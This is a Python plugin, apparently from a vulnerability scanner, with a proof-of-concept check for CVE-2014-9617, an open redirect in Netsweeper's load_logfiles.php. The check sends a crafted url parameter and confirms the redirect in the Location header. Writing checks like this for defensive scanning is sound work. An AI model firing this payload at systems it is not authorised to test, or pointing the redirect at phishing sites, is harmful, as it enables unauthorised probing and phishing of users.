import requests
import re


# Vuln Base Info
def info():
    return {
        "author": "cckuailong",
        "name": '''Netsweeper 3.0.6 - Open Redirection''',
        "description": '''An open redirect vulnerability in remotereporter/load_logfiles.php in Netsweeper before 4.0.5 allows remote attackers to redirect users to arbitrary web sites and conduct phishing attacks via a URL in the url parameter.''',
        "severity": "medium",
        "references": [
            "https://packetstormsecurity.com/files/download/133034/netsweeper-issues.tgz", 
            "https://nvd.nist.gov/vuln/detail/CVE-2014-9617"
        ],
        "classification": {
            "cvss-metrics": "CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:L/I:L/A:N",
            "cvss-score": "6.1",
            "cve-id": "CVE-2014-9617",
            "cwe-id": "CWE-601"
        },
        "metadata":{
            "vuln-target": "",
            
        },
        "tags": ["cve", "cve2014", "netsweeper", "redirect"],
    }


# Vender Fingerprint
def fingerprint(url):
    return True

# Proof of Concept
def poc(url):
    result = {}
    try:
        url = format_url(url)
        path = '/remotereporter/load_logfiles.php?server=127.0.0.1&url=https://example.com/'

        resp = requests.get(url+path, timeout=10, verify=False, allow_redirects=False)
        if "Location" in resp.headers and re.search(r'(?m)(?:https?://|//)(?:[a-zA-Z0-9\-_\.@]*)example\.com.*$', resp.headers['Location']):
            result["success"] = True
            result["info"] = info()
            result["payload"] = url+path

    except:
        result["success"] = False
    
    return result


# Exploit, can be same with poc()
def exp(url):
    return poc(url)


# Utils
def format_url(url):
    url = url.strip()
    if not ( url.startswith('http://') or url.startswith('https://') ):
        url = 'http://' + url
    url = url.rstrip('/')

    return url